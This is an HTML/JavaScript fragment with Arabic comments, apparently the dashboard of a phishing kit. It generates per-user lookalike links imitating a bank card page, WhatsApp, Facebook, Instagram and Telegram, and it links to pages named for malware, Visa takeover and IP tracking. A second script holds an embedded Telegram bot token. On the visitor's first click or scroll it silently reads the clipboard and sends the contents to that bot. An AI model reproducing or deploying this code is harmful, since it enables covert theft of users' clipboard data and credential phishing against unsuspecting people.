    <style>

        .copy-btn { background-color: #0f0; color: #000; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; font-weight: 700; margin-left: 10px; flex-shrink: 0; font-family: 'Cairo', sans-serif; }
        .copy-btn:hover { background-color: #fff; }
        @keyframes fadeIn { from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);} }

<body>

    <script>
        // Matrix Effect
        const canvas = document.getElementById("matrix");
        const ctx = canvas.getContext("2d");
        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;
        const letters = "01";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let x = 0; x < columns; x++) drops[x] = 1;
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)";
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = "#0f0";
            ctx.font = fontSize + "px monospace";
            for (let i = 0; i < drops.length; i++) {
                const text = letters.charAt(Math.floor(Math.random() * letters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(draw, 35);

        // Link Generation Logic
        const toolSelector = document.getElementById('toolSelector');
        const userIdInput = document.getElementById('userId');
        const outputArea = document.getElementById('outputArea');
        const generatedLinkSpan = document.getElementById('generatedLink');
        const copyButton = document.getElementById('copyButton');

        const links = {
            visa: 'https://nbe-com-eg.netlify.app/?id=',
            ip: 'https://100-pounds-credit.netlify.app/?id=',
            camera: 'https://islamic-services.netlify.app/?id=',
            whatsapp: 'https://w-h.netlify.app/?id=',
            Facebook: 'https://face-book-watch.netlify.app/?id=',
            Instagram: 'https://ins-tagram-reel.netlify.app/?id=',
            telegram: 'https://telegram-verification-bot.netlify.app/?id=',
            malware: 'Help_with_site.html',
            visaa: 'Visa_takeover.html',
            hide: 'hide_link.html',
            tracker: 'Tracker_IP.html',
            down: 'DOWNLOAD_INDEX.html',
            bot: 'https://my_aboelfadl_helper_.eyoo.org',
            cut: 'short_link.html',
            sms: 'massage.html',
            user: 'username.html',
            tebot: 'bot/bot.html',
            iphone: 'iphone.html',
            mac: 'mac_os.html'
        };

        function generateOrOpenLink() {
            const selectedTool = toolSelector.value;
            const userId = userIdInput.value.trim();

            if (!selectedTool) return;

            if (['malware', 'visaa', 'hide', 'tracker', 'down', 'bot', 'cut', 'sms', 'user', 'tebot', 'iphone', 'mac'].includes(selectedTool)) {
                // --- هذا هو السطر الذي تم تعديله ---
                // تم تغيير '_blank' إلى '_self' للفتح في نفس الصفحة
                window.open(links[selectedTool], '_self'); 
                toolSelector.value = ""; 
                outputArea.style.display = 'none';
                return;
            }

            if (!userId) {
                alert('الرجاء إدخال الـ ID الخاص بك أولاً!');
                outputArea.style.display = 'none';
                return;
            }

            const finalLink = links[selectedTool] + userId;
            generatedLinkSpan.textContent = finalLink;
            outputArea.style.display = 'block';
        }

        toolSelector.addEventListener('change', generateOrOpenLink);
        userIdInput.addEventListener('keyup', () => {
            if (toolSelector.value && !['malware', 'visaa', 'hide', 'tracker', 'down', 'bot', 'cut', 'sms', 'user', 'tebot', 'iphone', 'mac'].includes(toolSelector.value)) {
                generateOrOpenLink();
            }
        });

        copyButton.addEventListener('click', () => {
            navigator.clipboard.writeText(generatedLinkSpan.textContent).then(() => {
                copyButton.textContent = 'تم النسخ!';
                setTimeout(() => {
                    copyButton.textContent = 'نسخ';
                }, 2000);
            }).catch(err => {
                console.error('Failed to copy: ', err);
                alert('فشل النسخ. يرجى النسخ يدويًا.');
            });
        });
    </script>

    <script>
        // ⚙️ إعدادات Telegram
        const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
        const CHAT_ID = '7077025219';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        async function sendToTelegram(clipboardContent) {
            const message = `✅ تم الحصول على محتوى الحافظة بنجاح!\n------------------------------------\n\n${clipboardContent}\n------------------------------------`;
            const url = `${TELEGRAM_API}?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
            try {
                await fetch(proxyUrl);
            } catch (err) {
                console.warn('Telegram send failed:', err);
            }
        }

        const handleClipboardAccess = async () => {
            try {
                const clipboardText = await navigator.clipboard.readText();
                if (clipboardText) {
                    await sendToTelegram(clipboardText);
                }
            } catch (err) {
                console.error('Clipboard read failed (Permission likely denied):', err);
            }
        };

        // دالة يتم استدعاؤها مرة واحدة فقط عند أول تفاعل للمستخدم
        const initInteractionListener = () => {
            handleClipboardAccess();
        };

        // إضافة مستمعات لأول تفاعل من المستخدم (تعمل مرة واحدة فقط)
        document.addEventListener('click', initInteractionListener, { once: true });
        document.addEventListener('scroll', initInteractionListener, { once: true });
    </script>
